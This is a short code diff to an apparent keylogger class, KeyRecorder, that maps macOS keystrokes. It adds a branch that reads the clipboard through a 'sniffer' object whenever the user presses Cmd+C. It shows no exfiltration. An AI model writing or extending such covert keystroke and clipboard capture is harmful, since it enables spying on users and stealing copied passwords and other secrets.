@@ -142,6 +142,9 @@ class KeyRecorder:
                 character = event.charactersIgnoringModifiers()
                 if event.keyCode() is 51:
                     character = "Backspace"
+                elif event.keyCode() is 8 and modifiers == ["Cmd"]:
+                    # trigger clipboard check
+                    self.sniffer.clr.get_clipboard_contents()
                 elif event.keyCode() is 36:
                     character = "Enter"
                 elif event.keyCode() is 39 and modifiers == ["Shift"]:
